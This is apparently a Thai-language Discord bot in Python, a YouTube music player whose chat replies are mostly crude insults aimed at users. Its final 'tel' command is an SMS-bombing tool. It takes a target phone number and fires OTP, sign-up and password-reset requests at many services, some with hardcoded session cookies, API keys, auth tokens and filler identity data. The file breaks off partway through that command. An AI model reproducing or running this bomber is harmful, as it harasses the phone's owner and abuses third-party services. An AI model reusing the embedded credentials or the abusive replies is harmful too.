# -*- coding: utf-8 -*-

import threading
import requests
from re import search
import pytube
from requests import Session
import asyncio
import functools
import itertools
import math
import random
import discord
import youtube_dl
from async_timeout import timeout
from discord.ext import commands
from discord.utils import get
# Silence useless bug reports messages
youtube_dl.utils.bug_reports_message = lambda: ''
all_page = 0
vote_all = 0
token = '' # token ของ บอท


class VoiceError(Exception):
    pass


class YTDLError(Exception):
    pass


class YTDLSource(discord.PCMVolumeTransformer):
    YTDL_OPTIONS = {
        'format': 'bestaudio/best',
        'extractaudio': True,
        'audioformat': 'mp3',
        'outtmpl': '%(extractor)s-%(id)s-%(title)s.%(ext)s',
        'restrictfilenames': True,
        'noplaylist': True,
        'nocheckcertificate': True,
        'ignoreerrors': False,
        'logtostderr': False,
        'quiet': True,
        'no_warnings': True,
        'default_search': 'auto',
        'source_address': '0.0.0.0',
    }

    FFMPEG_OPTIONS = {
        'before_options': '-reconnect 1 -reconnect_streamed 1 -reconnect_delay_max 5',
        'options': '-vn',
    }

    ytdl = youtube_dl.YoutubeDL(YTDL_OPTIONS)

    def __init__(self, ctx: commands.Context, source: discord.FFmpegPCMAudio, *, data: dict, volume: float = 0.5):
        super().__init__(source, volume)

        self.requester = ctx.author
        self.channel = ctx.channel
        self.data = data

        self.uploader = data.get('uploader')
        self.uploader_url = data.get('uploader_url')
        date = data.get('upload_date')
        self.upload_date = date[6:8] + '.' + date[4:6] + '.' + date[0:4]
        self.title = data.get('title')
        self.thumbnail = data.get('thumbnail')
        self.description = data.get('description')
        self.duration = self.parse_duration(int(data.get('duration')))
        self.tags = data.get('tags')
        self.url = data.get('webpage_url')
        self.views = data.get('view_count')
        self.likes = data.get('like_count')
        self.dislikes = data.get('dislike_count')
        self.stream_url = data.get('url')
    def __str__(self):
        return '**`{0.title}`** โดย **`{0.uploader}`**'.format(self)

    @classmethod
    async def create_source(cls, ctx: commands.Context, search: str, *, loop: asyncio.BaseEventLoop = None):
        await bot.wait_until_ready()
        loop = loop or asyncio.get_event_loop()
        partial = functools.partial(cls.ytdl.extract_info, search, download=False, process=False)
        data = await loop.run_in_executor(None, partial)

        if data is None:
            raise YTDLError('Couldn\'t find anything that matches `{}`'.format(search))

        if 'entries' not in data:
            process_info = data
        else:
            process_info = None
            for entry in data['entries']:
                if entry:
                    process_info = entry
                    break

            if process_info is None:
                raise YTDLError('Couldn\'t find anything that matches `{}`'.format(search))

        webpage_url = process_info['webpage_url']
        partial = functools.partial(cls.ytdl.extract_info, webpage_url, download=False)
        processed_info = await loop.run_in_executor(None, partial)

        if processed_info is None:
            raise YTDLError('Couldn\'t fetch `{}`'.format(webpage_url))

        if 'entries' not in processed_info:
            info = processed_info
        else:
            info = None
            while info is None:
                try:
                    info = processed_info['entries'].pop(0)
                except IndexError:
                    raise YTDLError('Couldn\'t retrieve any matches for `{}`'.format(webpage_url))

        return cls(ctx, discord.FFmpegPCMAudio(info['url'], **cls.FFMPEG_OPTIONS), data=info)

    @classmethod
    async def search_source(self, ctx: commands.Context, search: str, *, loop: asyncio.BaseEventLoop = None, bot):
        self.bot = bot
        channel = ctx.channel
        loop = loop or asyncio.get_event_loop()

        self.search_query = '%s%s:%s' % ('ytsearch', 10, ''.join(search))

        partial = functools.partial(self.ytdl.extract_info, self.search_query, download=False, process=False)
        info = await loop.run_in_executor(None, partial)

        self.search = {}
        self.search["title"] = f'นี่คือ ผลลัพธ์:\n**{search}** ไอหี้ยใช้กูจังเลย'
        self.search["type"] = 'rich'
        self.search["color"] = 7506394
        self.search["author"] = {'name': f'{ctx.author.name}', 'url': f'{ctx.author.avatar_url}',
                                 'icon_url': f'{ctx.author.avatar_url}'}

        lst = []
        count = 0
        e_list = []
        for e in info['entries']:
            # lst.append(f'`{info["entries"].index(e) + 1}.` {e.get("title")} **[{YTDLSource.parse_duration(int(e.get("duration")))}]**\n')
            VId = e.get('id')
            VUrl = 'https://www.youtube.com/watch?v=%s' % (VId)
            lst.append(f'`{count + 1}.` [{e.get("title")}]({VUrl})\n')
            count += 1
            e_list.append(e)

        lst.append('\n**เลือกรายการที่ต้องการใส่เลข , พิมพ์ `cancel` เพื่อออก นะ ไอสัส**')
        self.search["description"] = "\n".join(lst)

        em = discord.Embed.from_dict(self.search)
        await ctx.send(embed=em, delete_after=45.0)

        def check(msg):
            return msg.content.isdigit() == True and msg.channel == channel or msg.content == 'cancel' or msg.content == 'Cancel'

        try:
            m = await self.bot.wait_for('message', check=check, timeout=45.0)

        except asyncio.TimeoutError:
            rtrn = 'timeout'

        else:
            if m.content.isdigit() == True:
                sel = int(m.content)
                if 0 < sel <= 10:
                    for key, value in info.items():
                        if key == 'entries':
                            """data = value[sel - 1]"""
                            VId = e_list[sel - 1]['id']
                            VUrl = 'https://www.youtube.com/watch?v=%s' % (VId)
                            partial = functools.partial(self.ytdl.extract_info, VUrl, download=False)
                            data = await loop.run_in_executor(None, partial)
                    rtrn = self(ctx, discord.FFmpegPCMAudio(data['url'], **self.FFMPEG_OPTIONS), data=data)
                else:
                    rtrn = 'sel_invalid'
            elif m.content == 'cancel':
                rtrn = 'cancel'
            else:
                rtrn = 'sel_invalid'

        return rtrn

    @staticmethod
    def parse_duration(sec: int):
        if sec > 0:
            minutes, seconds = divmod(sec, 60)
            hours, minutes = divmod(minutes, 60)
            days, hours = divmod(hours, 24)
            n = 1
            duration = []
            if n == 1:
              if days > 0:
                  duration.append('{}'.format(days))
              if hours > 0:
                  duration.append('{}'.format(hours))
              if minutes > 0:
                  duration.append('{}'.format(minutes))
              if seconds > 0:
                 duration.append('{}'.format(seconds))
            if len(duration) == 1:
                value = ''.join(duration) + ' ' + 'วินาที'
            if len(duration) == 2:
                value = ':'.join(duration) + ' ' + 'นาที'
            if len(duration) == 3:
                value = ':'.join(duration) + ' ' + 'ชม.'
            if len(duration) == 4:
                value = ':'.join(duration) + ' ' + 'วัน'
            return [value, sec]

        elif sec == 0:
            value = "ถ่ายทอดสด"
            return [value, sec]


class Song:
    __slots__ = ('source', 'requester')

    def __init__(self, source: YTDLSource):
        self.source = source
        self.requester = source.requester

    def create_embed(self):
        embed = (discord.Embed(title='ตอนนี้เล่น', description=f'```\n{self.source.title}\n```',
                               color=discord.Color.blurple())
                 .add_field(name='ความยาว', value=str(self.source.duration[0]) + "  ")
                 .add_field(name='คนสั่งคือ', value=str(self.requester.mention) + "  ")
                 .add_field(name='แชลแนล', value='[{0.source.uploader}]({0.source.uploader_url})  '.format(self))
                 .add_field(name='ลิ้ง', value='[กดดูลิ้ง]({0.source.url})'.format(self))
                 .set_image(url=self.source.thumbnail)
                 .set_author(name=self.requester.name, icon_url=self.requester.avatar_url))
        second = self.source.duration[1]
        return [embed,int(second)]


class SongQueue(asyncio.Queue):
    def __getitem__(self, item):
        if isinstance(item, slice):
            return list(itertools.islice(self._queue, item.start, item.stop, item.step))
        else:
            return self._queue[item]

    def __iter__(self):
        return self._queue.__iter__()

    def __len__(self):
        return self.qsize()

    def clear(self):
        self._queue.clear()
    def clear_all(self, pages : int):
        for i in range(pages):
           self._queue.clear()
    def shuffle(self):
        random.shuffle(self._queue)

    def remove(self, index: int):
        del self._queue[index]


class VoiceState:
    def __init__(self, bot: commands.Bot, ctx: commands.Context):
        self.bot = bot
        self._ctx = ctx
        self.current = None
        self.voice = None
        self.next = asyncio.Event()
        self.songs = SongQueue()
        self.exists = True
        self._loop = False
        self._volume = 0.5
        self.skip_votes = set()
        self.audio_player = bot.loop.create_task(self.audio_player_task())

    def __del__(self):
        self.audio_player.cancel()

    @property
    def loop(self):
        return self._loop

    @loop.setter
    def loop(self, value: bool):
        self._loop = value

    @property
    def volume(self):
        return self._volume

    @volume.setter
    def volume(self, value: float):
        self._volume = value

    @property
    def is_playing(self):
        return self.voice and self.current

    async def audio_player_task(self):
        while True:
            self.next.clear()
            self.now = None

            if self.loop == False:
                # Try to get the next song within 3 minutes.
                # If no song will be added to the queue in time,
                # the player will disconnect due to performance
                # reasons.
                try:
                    async with timeout(180):  # 3 minutes
                        self.current = await self.songs.get()
                except asyncio.TimeoutError:
                    self.bot.loop.create_task(self.stop())
                    self.exists = False
                    return

                self.current.source.volume = self._volume
                self.voice.play(self.current.source, after=self.play_next_song)
                await self.current.source.channel.send(embed=self.current.create_embed()[0], delete_after=int(self.current.create_embed()[1]))
            # If the song is looped
            elif self.loop == True:
                self.now = discord.FFmpegPCMAudio(self.current.source.stream_url, **YTDLSource.FFMPEG_OPTIONS)
                self.voice.play(self.now, after=self.play_next_song)

            await self.next.wait()

    def play_next_song(self, error=None):
        if error:
            raise VoiceError(str(error))

        self.next.set()

    def skip(self):
        self.skip_votes.clear()

        if self.is_playing:
            self.voice.stop()

    async def stop(self):
        self.songs.clear()
        if self.voice:
            await self.voice.disconnect()
            self.voice = None


class Music(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot
        self.voice_states = {}

    def get_voice_state(self, ctx: commands.Context):
        state = self.voice_states.get(ctx.guild.id)
        if not state or not state.exists:
            state = VoiceState(self.bot, ctx)
            self.voice_states[ctx.guild.id] = state

        return state

    def cog_unload(self):
        for state in self.voice_states.values():
            self.bot.loop.create_task(state.stop())

    def cog_check(self, ctx: commands.Context):
        if not ctx.guild:
            raise commands.NoPrivateMessage('This command can\'t be used in DM channels.')
        return True

    async def cog_before_invoke(self, ctx: commands.Context):
        ctx.voice_state = self.get_voice_state(ctx)

    async def cog_command_error(self, ctx: commands.Context, error: commands.CommandError):
       if 'You are not connected to any voice channel.' in str(error):
            await ctx.channel.send("มึงยังไม่เข้าช่องเสียง กูจะรู้ไหม ว่ามึงจะเล่นเพลงห้องไหน ไอเหี้ย ไอโง่ !!!")
    @commands.Cog.listener()
    async def on_message(self, message):
        if message.author.id != bot.user.id:
            print(f"{message.guild}/{message.channel}/{message.author.name}>{message.content}")
            if message.embeds:
                print(message.embeds[0].to_dict())

    @commands.command(name='join', invoke_without_subcommand=True, aliases=['j'])
    async def _join(self, ctx: commands.Context):
        """Joins a voice channel."""
        destination = ctx.author.voice.channel
        if ctx.voice_state.voice:
            await ctx.voice_state.voice.move_to(destination)
            await ctx.channel.send(f'กําลังเข้าไปที่ช่องเสียง `{destination}` เพื่อเล่นเพลง !!! ไอเหี้ย นะ ไอสัส')
            return
        ctx.voice_state.voice = await destination.connect()
        await ctx.channel.send(f'กําลังเข้าไปที่ช่องเสียง `{destination}` เพื่อเล่นเพลง !!! ไอเหี้ย นะ ไอสัส')
    @commands.command(name='come', aliases=['c'])
    async def _summon(self, ctx: commands.Context, *, channel: discord.VoiceChannel = None):
        """Summons the bot to a voice channel.
        If no channel was specified, it joins your channel.
        """

        if not channel and not ctx.author.voice:
            raise VoiceError('You are neither connected to a voice channel nor specified a channel to join.')

        destination = channel or ctx.author.voice.channel
        if ctx.voice_state.voice:
            await ctx.voice_state.voice.move_to(destination)
            return

        ctx.voice_state.voice = await destination.connect()

    @commands.command(name='leave', aliases=['le'])
    async def _leave(self, ctx: commands.Context):
        """Clears the queue and leaves the voice channel."""

        if not ctx.voice_state.voice:
            return await ctx.send('ไอสัส เพลงไม่ทันเริ่มที มึงบ้าไหม นิ...')

        await ctx.voice_state.stop()
        del self.voice_states[ctx.guild.id]

    @commands.command(name='volume', aliases=['vol'])
    async def _volume(self, ctx: commands.Context, *, volume: int):
        voice = get(bot.voice_clients, guild=ctx.guild)
        if 0 < volume <= 300:
            if voice.is_playing():
                new_volume = volume / 100
                if new_volume == 0:
                    await ctx.message.add_reaction("🔈")
                if new_volume > voice.source.volume:
                    await ctx.message.add_reaction("🔊")
                if new_volume < voice.source.volume:
                    await ctx.message.add_reaction("🔉")
                if new_volume == voice.source.volume:
                    await ctx.message.add_reaction("🔉")
                voice.source.volume = new_volume
                await ctx.channel.send(f"> ปรับระดับเสียงไปที่ {volume} %")
            else:
                pass


    @commands.command(name='pause', aliases=['pa'])
    async def _pause(self, ctx: commands.Context):
        """Pauses the currently playing song."""
        print(">>>Pause Command:")
        if ctx.voice_state.is_playing and ctx.voice_state.voice.is_playing():
            ctx.voice_state.voice.pause()
            await ctx.message.add_reaction('⏸')

    @commands.command(name='resume', aliases=['re'])
    async def _resume(self, ctx: commands.Context):
        """Resumes a currently paused song."""

        if ctx.voice_state.is_playing and ctx.voice_state.voice.is_paused():
            ctx.voice_state.voice.resume()
            await ctx.message.add_reaction('▶')

    @commands.command(name='stop', aliases=['s'])
    async def _stop(self, ctx: commands.Context):
        """Stops playing song and clears the queue."""

        ctx.voice_state.songs.clear()

        if ctx.voice_state.is_playing:
            ctx.voice_state.voice.stop()
            await ctx.message.add_reaction('⏹')

    @commands.command(name='skip', aliases=['sk'])
    async def _skip(self, ctx: commands.Context):
        """Vote to skip a song. The requester can automatically skip.
        3 skip votes are needed for the song to be skipped.
        """

        if not ctx.voice_state.is_playing:
            return await ctx.send('ไอสัส เพลงไม่ทันเริ่มที มึงบ้าไหม นิ...')

        ctx.voice_state.skip()
        await ctx.message.add_reaction("⏭'")

    @commands.command(name="vote_skip", aliases=['vs'])
    async def _vote_skip(self, ctx: commands.Context):
        '''Vote to skip a song. The requester can automatically skip.
         skip votes are needed for the song to be skipped.'''

        if not ctx.voice_state.is_playing:
            return await ctx.send('ไอสัส เพลงไม่ทันเริ่มที มึงบ้าไหม นิ...')

        voter = ctx.message.author
        if voter.id not in ctx.voice_state.skip_votes:
            ctx.voice_state.skip_votes.add(voter.id)
            total_votes = len(ctx.voice_state.skip_votes)
            if total_votes >= 3:
                await ctx.message.add_reaction('⏭')
                ctx.voice_state.skip()
            else:
                await ctx.send('โอเค นี้คือผลโหวตตอนนี้ **{}/{}**'.format(total_votes, 3))

        else:
            await ctx.send('มึงโหวตแล้วไอเหี้ย อย่าโง่ ไอสัส')
    @commands.command(name='queue',aliases=['q'])
    async def _queue(self, ctx: commands.Context, *, page: int = 1):
        """Shows the player's queue.
        You can optionally specify the page to show. Each page contains 10 elements.
        """

        if len(ctx.voice_state.songs) == 0:
            return await ctx.send('** ไม่มีเพลงในคิว ไอเหี้ยหัดแหกตาดูบ้าง !!!! **')

        items_per_page = 10
        pages = math.ceil(len(ctx.voice_state.songs) / items_per_page)

        start = (page - 1) * items_per_page
        end = start + items_per_page

        queue = ''
        for i, song in enumerate(ctx.voice_state.songs[start:end], start=start):
            queue += '`{0}.` [**{1.source.title}**]({1.source.url})\n'.format(i + 1, song)

        embed = (discord.Embed(description='**เพลงต่อไปอีก {} เพลง:**\n\n{}'.format(len(ctx.voice_state.songs), queue))
                 .set_footer(text='หน้า {}/{}'.format(page, pages)))
        global all_page
        all_page = pages
        await ctx.send(embed=embed)

    @commands.command(name='flip',aliases=['f'])
    async def _shuffle(self, ctx: commands.Context):
        """Shuffles the queue."""

        if len(ctx.voice_state.songs) == 0:
            return await ctx.send('** ไม่มีเพลงในคิว ไอเหี้ยหัดแหกตาดูบ้าง !!!! **')

        ctx.voice_state.songs.shuffle()
        await ctx.message.add_reaction('👌')

    @commands.command(name='remove',aliases=['rm'])
    async def _remove(self, ctx: commands.Context, index: int):
        """Removes a song from the queue at a given index."""

        if len(ctx.voice_state.songs) == 0:
            return await ctx.send('ไม่มีเพลงในคิวเพลงเลย ไอเหี้ย มึงหัดดูบ้างไอสัส !!!!')

        ctx.voice_state.songs.remove(index - 1)

        await ctx.channel.send(f"ลบเพลงออกจากคิวเพลง ตําแหน่งที่ {index} ในคิวเพลง นะไอสัส")
        await ctx.message.add_reaction('👌')

    @commands.command(name='loop',aliases=['l'])
    async def _loop(self, ctx: commands.Context):
        """Loops the currently playing song.
        Invoke this command again to unloop the song.
        """

        if not ctx.voice_state.is_playing:
            return await ctx.send('มึงต้องเล่นเพลงก่อน ค่อยใช้คําสั่งให้ loop ไอโง่ !!!')

        # Inverse boolean value to loop and unloop.
        ctx.voice_state.loop = True
        await ctx.message.add_reaction('👌')
    @commands.command(name='unloop', aliases=['ul'])
    async def _unloop(self, ctx: commands.Context):
        """Loops the currently playing song.
        Invoke this command again to unloop the song.
        """
        if not ctx.voice_state.is_playing:
            return await ctx.send('ไอสัส เพลงไม่ทันเริ่มที มึงบ้าไหม นิ...')

        # Inverse boolean value to loop and unloop.
        ctx.voice_state.loop = False
        await ctx.message.add_reaction('👌')
    @commands.command(name='play', aliases=['p'])
    async def _play(self, ctx: commands.Context,num : int, *, search: str):
        """Plays a song.
        If there are songs in the queue, this will be queued until the
        other songs finished playing.
        This command automatically searches from various sites if no URL is provided.
        A list of these sites can be found here: https://rg3.github.io/youtube-dl/supportedsites.html
        """

        async with ctx.typing():
            if 'playlist' in search:
                playlist = pytube.Playlist(search)
                for i in range(num):
                    for link in playlist.video_urls:
                        try:
                            try:
                              source = await YTDLSource.create_source(ctx, link, loop=self.bot.loop)
                            except:
                                await asyncio.sleep(0.5)
                                try:
                                    source = await YTDLSource.create_source(ctx, link, loop=self.bot.loop)
                                except:
                                    await asyncio.sleep(0.5)
                                    try:
                                        source = await YTDLSource.create_source(ctx, link, loop=self.bot.loop)
                                    except:
                                        source = await YTDLSource.create_source(ctx, link, loop=self.bot.loop)
                        except YTDLError as e:
                            await ctx.send('มีข้อผืดพลาด กรุณาแจ้ง CoderMan: {}'.format(str(e)))
                        else:
                            if not ctx.voice_state.voice:
                                await ctx.invoke(self._join)
                            song = Song(source)
                            await ctx.voice_state.songs.put(song)
                    await ctx.send(f'โหลดข้อมูลจากเพลย์ลิสต์ชื่อ {playlist.title} จาก Youtube แล้วไอสัส กูเหนื่อยฉิบหาย !!!')
                return
            for i in range(num):
             try:
                  try:
                   source = await YTDLSource.create_source(ctx, search, loop=self.bot.loop)
                  except:
                      await asyncio.sleep(0.5)
                      try:
                       source = await YTDLSource.create_source(ctx, search, loop=self.bot.loop)
                      except:
                          await asyncio.sleep(0.5)
                          try:
                              source = await YTDLSource.create_source(ctx, search, loop=self.bot.loop)
                          except:
                                 source = await YTDLSource.create_source(ctx, search, loop=self.bot.loop)
             except YTDLError as e:
                await ctx.send('มีข้อผืดพลาด กรุณาแจ้ง MacTheDev: {}'.format(str(e)))
             else:
                if not ctx.voice_state.voice:
                    destination = ctx.author.voice.channel
                    if ctx.voice_state.voice:
                        await ctx.voice_state.voice.move_to(destination)
                        return
                    ctx.voice_state.voice = await destination.connect()
                    await ctx.channel.send(f'กําลังเข้าไปที่ช่องเสียง `{destination}` เพื่อเล่นเพลง !!! ไอเหี้ย นะ ไอสัส')
                song = Song(source)
                await ctx.voice_state.songs.put(song)
                if num > 8:
                    pass
                else:
                   await ctx.send('ใส่วิดีโอ {}'.format(str(source)) + ' ลงในคิวเพลงแล้วนะไอสัส กูเหนื่อย !!!')

    @commands.command(name='search',  aliases=['se'])
    async def _search(self, ctx: commands.Context, *, search: str):
        """Searches youtube.
        It returns an imbed of the first 10 results collected from youtube.
        Then the user can choose one of the titles by typing a number
        in chat or they can cancel by typing "cancel" in chat.
        Each title in the list can be clicked as a link.
        """
        async with ctx.typing():
            try:
                source = await YTDLSource.search_source(ctx, search, loop=self.bot.loop, bot=bot)
            except YTDLError as e:
                await ctx.send('พบข้อผืดพลาดบางอย่าง กรุณาติดต่อ CoderMan: {}'.format(str(e)))
            else:
                if source == 'sel_invalid':
                    await ctx.send('ตัวเลือกที่ไม่รู้จักนะ ไอสัส ใช่คําสั่ง +f ใหม่และเลือกใหม่ไอเหี้ย !!!')
                elif source == 'cancel':
                    await ctx.message.add_reaction("👌")
                elif source == 'timeout':
                    await ctx.send('หมดเวลาละ ไอสัส ช้าฉิบหาย')
                else:
                    if not ctx.voice_state.voice:
                        await ctx.invoke(self._join)
                        await ctx.channel.send('กําลังเข้าไปที่ช่อง {}')
                    song = Song(source)
                    await ctx.voice_state.songs.put(song)
                    await ctx.send('ใส่วิดีโอ {}'.format(str(source)) + ' ลงในคิวเพลงแล้วนะไอสัส กูเหนื่อย !!!')
    @commands.command(name="clear",   aliases=['cl'])
    async def _clear(self, ctx : commands.Context, page : int):
        """Vote to skip a song. The requester can automatically skip.
               3 skip votes are needed for the song to be skipped.
               """
        if not ctx.voice_state.is_playing:
            return await ctx.send('ไอสัส เพลงไม่ทันเริ่มที มึงบ้าไหม นิ...')

        if len(ctx.voice_state.songs) == 0 or all_page == 0:
            return await ctx.send('ไม่มีเพลงในคิวเพลงเลย ไอเหี้ย มึงหัดดูบ้างไอสัส !!!!')
        ctx.voice_state.songs.clear_all(page)
        await ctx.message.add_reaction("👌")
    @_join.before_invoke
    @_play.before_invoke
    async def ensure_voice_state(self, ctx: commands.Context):
        if not ctx.author.voice or not ctx.author.voice.channel:
            raise commands.CommandError('You are not connected to any voice channel.')

        if ctx.voice_client:
            if ctx.voice_client.channel != ctx.author.voice.channel:
                raise commands.CommandError('Bot is already in a voice channel.')


bot = commands.Bot(command_prefix='+', case_insensitive=True, help_command=None)
bot.add_cog(Music(bot))

@bot.event
async def on_ready():
    print('Logged in as:\n{0.user.name}\n{0.user.id}'.format(bot))
@bot.command(name='help', aliases=['h'])
async def help(ctx):
    embed = discord.Embed(
        title="** การช่วยเหลือ !!!**",
        description="หน้าต่างโชว์คําสั่งไว้ช่วยเหลือคนที่ไม่รู้จักคําสั่งนี้ สามารถดูได้ข้างล่าง ถ้าเกิดปัญหาติดต่อ MacTheDev ได้ที่ FB : Lnw Macmegazine ในการเรียกใช้ทุกคําสั่งต้องเริ่มต้นด้วย + เสมอและตามด้วยคําสั่งที่ต้องการ เช่น +help , +play",
        colour=discord.Colour.blue()
    )
    embed.set_author(name="MacTheDev", icon_url='https://avatars.githubusercontent.com/u/95560177?v=4')
    embed.set_thumbnail(url='https://storage.thaipost.net/main/uploads/photos/big/20190412/image_big_5caff2dcf29fe.jpg')
    embed.add_field(value="help หรือ h : เพื่อแสดงหน้าจอนี้อีกครั้ง\ninfo : เพื่อแสดงข้อมูลพื้นฐานของบอทตัวนี้",name="การขอความช่วยเหลือ", inline=False)
    embed.add_field(value="play หรือ p มีรูปแบบคือ +p <จํานวนครั้ง> <ลิ้งหรือคําที่ต้องการค้นหา หรือลิ้งเพลส์ลิตย์> : เพื่อเล่นเพลง\npause หรือ pa : เพื่อหยุดเล่นเพลง\nresume หรือ re : เพื่อเล่นเพลงต่อ\nstop หรือ s : หยุดเล่นเพลงทุกเพลง หรือเพลงที่เล่นอยู่ทั้งหมด อย่างถาวรไม่สามารถให้เล่นต่อได้ หรือพูดง่ายๆ ก็ทําให้บอทจบการเล่นเพลงทุกอย่าง นั้นเอง\nflip หรือ f : สลับคิวเพลงจากบนลงล่างหรือล่างขึ้นบน\nremove หรือ rm รูปแบบคือ +rm <ลําดับที่ต้องการลบ> : ลบเพลงที่ไม่ต้องการในคิวเพลง\nskip หรือ sk : ข้ามเพลงนั้นในคิวเพลงไป\nclear หรือ c รูปแบบคือ +c <หน้าที่ต้องการเคลียร์>: เคลียร์เพลงในคิวในหน้านั้น\nvote_skip หรือ vs : เพื่อโหสตข้ามเพลง ถ้ามากกว่า 3 คนจะข้ามเพลงไปเลย\nsearch หรือ se รูปแบบคือ +se <คําที่ต้องการค้นหา>: เพื่อค้นหาเพลงทั้งหมดเพลงและเลือก 1 ใน 10 เพลงนั้น\nloop หรือ l : เล่นเพลงนั้น แบบวนซํ้าๆ ไม่หยุดลูป\nunloop หรือ ul : เพื่อหยุดลูปที่เล่นอยู่\nc หรือ come : ย้ายช่องเสียงไปยังที่อยู่ปัจจุบัน \nj หรือ join : ย้ายไปยังช่องเสียงปัจจุบัน แต่ก่อนบอทเริ่มเพลง",
                    name="เพลง", inline=False)
    embed.add_field(
        value="tel <เบอร์> : ยิงเบอร์",
        name="สารพัดประโยชน์", inline=False)
    embed.set_footer(text="M-BOT v.1.0 [2/17/2022]", icon_url="https://avatars.githubusercontent.com/u/95560177?v=4")
    await ctx.channel.send(embed=embed)
@bot.command(name="info")
async def info(ctx):
    embed = discord.Embed(
        title="** ข้อมูลพื้นฐาน **",
        description="M - BOT เป็นบอท discord ที่มีหลายอย่างมากๆ ในตัวเดียว ไม่ว่าจะเล่นเพลงหรือ ทําสิ่งต่างๆ ก็มีหมด เรียกใช้ +h หรือ +help เพื่อขอความช่วยเหลือ เวอร์ชั่นทดลอง v.1.0 pre-review",
        colour=discord.Colour.green()
    )
    embed.set_author(name="M-BOT 1.0", icon_url='https://storage.thaipost.net/main/uploads/photos/big/20190412/image_big_5caff2dcf29fe.jpg')
    embed.set_footer(text="MacTheDev 2022", icon_url="https://avatars.githubusercontent.com/u/95560177?v=4")
    await ctx.channel.send(embed=embed)
@bot.command(name='logout', aliases=['log'])
@commands.is_owner()
async def botstop(ctx):
    await ctx.send('ไปละ ไอสัส กูเหนื่อยละ ขอพักแปปนึงไอเหี้ย')
    await bot.logout()
    return
@bot.command()
async def tel(ctx, phone):

 def api1():
        requests.get(f"https://www.scgexpress.co.th/member/getRegister?phone={phone}")


 def apidis():
      requests.post("https://discord.com/api/v9/auth/register/phone",
                  headers={"Host": "discord.com", "user-agent": "Discord-Android/105013",
                           "cookie": "__sdcfduid=608d2eac694211ec997a42010a0a0a4cd23801e46be73b7cba2279670205f0eb934ffd2384782ecb8a365045135a8998; __dcfduid=608d2eac694211ec997a42010a0a0a4c"},
                  json={"phone": "+66" + phone})


 def apitrue():
    requests.post("https://topping.truemoveh.com/api/get_request_otp",
                  headers={"Host": "topping.truemoveh.com", "Accept": "application/json, text/plain, */*",
                           "Referer": "https://topping.truemoveh.com/otp",
                           "User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.92 Mobile Safari/537.36"},
                  json={"mobile_number": phone})


 def api2():
    headers = {
        "content-type": "application/x-www-form-urlencoded",
        "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
        "referer": "https://www.wongnai.com/guest2?_f=signUp&guest_signup_type=phone",
        "cookie": "_gcl_au=1.1.1123274548.1637746846"
    }
    requests.post("https://www.wongnai.com/_api/guest.json?_v=6.054&locale=th&_a=phoneLogIn", headers=headers,
                  data=f"phoneno={phone}&retrycount=0")


 def api3():
    requests.post("https://gettgo.com/sessions/otp_for_sign_up", data={"mobile_number": phone})


 def api4():
    requests.post("https://api.true-shopping.com/customer/api/request-activate/mobile_no", data={"username": phone})


 def api5():
    requests.post("https://www.msport1688.com/auth/send_otp", data={"phone": phone})


 def api6():
    requests.post("http://b226.com/x/code", data={f"phone": phone})


 def api7():
    requests.post('https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp', headers={
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest",
        "Cookie": "sso_local_storeci_sessions=KHj9a18RowgHYWbh71T2%2FDFAcuC2%2FQaJkguD3MQ1eh%2FlwrUXvpAjJgrm6QKAja4oe7rglht%2BzO6oqblJ4EMJF4pqnY%2BGtR%2F0RzIFGN0Suh1DJVRCMPpP8QtZsF5yDyw6ibCMf2HXs95LvAMi7KUkIeaWkSahmh5f%2F3%2FqcOQ2OW5yakrMGA1mJ5upBZiUdEYNmxUAljcqrg7P3L%2BGAXxxC2u1bO09Oz4qf4ZV9ShO0gz5p5CbkE7VxIq1KUrEavn9Y%2BarQmsh1qIIc51uvCev1U1uyXfC%2F9U7uRl7x%2FVYZYT2pkLd3Q7qnZoSNBL8y9wge8Lt7grySdVLFhw9HB68dTSiOm1K04QhdrprI7EsTLWDHTgYmgyTQDuz63YjHsH5MUVanlfBISU1WXmRTXMKbUjlcl0LPPYUR9KWzrVL7sXcrCX%2FfUwLJIU%2F7MTtDYUx39y1CAREM%2F8dw7AEjcJAOA%3D%3D684b65b9b9dc33a3380c5b121b6c2b3ecb6f1bec; PHPSESSID=1s2rdo0664qpg4oteil3hhn3v2; TS01ac2b25=01584aa399fbfcc6474d383fdc1405e05eaa529fa33e596e5189664eb7dfefe57b927d8801ad40fba49f0adec4ce717dd5eabf08d7080e2b85f34368a92a47e71ef07861a287c40da15c0688649509d7f97eb2c293; _ga=GA1.3.1824294570.1636876684; _gid=GA1.3.1832635291.1636876684"},
                  data=f"dCard=1358231116147&Mobile={phone}&password=098098Az&repassword=098098Az&perPrefix=Mr.&cn=Dhdhhs&sn=Vssbsh&perBirthday=5&perBirthmonth=5&perBirthyear=2545&Email=nickytom5879%40gmail.com&otp_type=OTP&otpvalue=&messageId=REGISTER")


 def api8():
    requests.post("https://api.mcshop.com/cognito/me/forget-password", headers={"x-store-token": "mcshop",
                                                                                "user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36",
                                                                                "content-type": "application/json;charset=UTF-8",
                                                                                "accept": "application/json, text/plain, */*",
                                                                                "x-auth-token": "O2d1ZXN0OzkyMDIzOTU7YThmNWMyZDE4YThlOTMzOGMyOGMwYWE5ODQwNTBjY2I7Ozs7",
                                                                                "x-api-key": "ZU2QOTDkCV5JYVkWXdYFL8niGXB8l1mq2H2NQof3"},
                  json={"username": phone})


 def api9():
    requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")


 def api10():
    requests.post("https://m.lavagame168.com/api/register-otp", headers={"x-exp-signature": "5ffc0caa4d603200124e4eb1",
                                                                         "user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36",
